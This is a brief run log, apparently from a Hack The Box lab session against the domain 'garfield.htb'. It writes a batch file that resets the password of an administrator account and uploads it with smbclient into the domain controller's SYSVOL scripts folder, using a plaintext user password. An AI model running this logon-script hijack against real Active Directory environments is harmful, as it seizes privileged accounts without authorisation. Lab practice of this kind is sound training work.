[19:25:12] RUN: # First, create the bat file locally
cat > /tmp/pwreset.bat << 'BATEOF'
@echo off
powershell.exe -NoProfile -Command "Set-ADAccountPassword -Identity 'l.wilson_adm' -Reset -NewPassword (ConvertTo-SecureString 'P@ssw0rd2026!' -AsPlainText -Force)"
BATEOF

# Upload to NETLOGON via SYSVOL
smbclient //10.129.17.158/SYSVOL -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts; put /tmp/pwreset.bat pwreset.bat; ls' 2>&1
